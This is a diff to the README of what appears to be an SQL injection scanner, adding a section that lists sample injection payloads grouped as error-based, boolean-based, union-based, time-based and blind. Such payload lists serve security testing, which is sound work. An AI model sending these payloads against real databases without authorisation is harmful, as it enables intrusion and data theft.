@@ -75,6 +75,32 @@ pip install -r requirements.txt
 
 # 3. Run the scanner
 python scanner.py
+```
+
+## 🎯 Detection Capabilities
+
+### SQL Injection Payloads Database
+```
+# Error-based (30+ payloads)
+"' OR '1'='1"
+"' UNION SELECT @@version--"
+"' AND SLEEP(5)--"
+
+# Boolean-based
+"' AND '1'='1"
+"' AND '1'='2"
+
+# Union-based
+"' UNION SELECT null,null--"
+"' UNION SELECT 1,2,3--"
+
+# Time-based
+"' OR IF(1=1,SLEEP(5),0)--"
+"'; WAITFOR DELAY '00:00:05'--"
+
+# Blind SQLi
+"' AND (SELECT ascii(substring(user(),1,1)))>100--"
+```
 
 
 
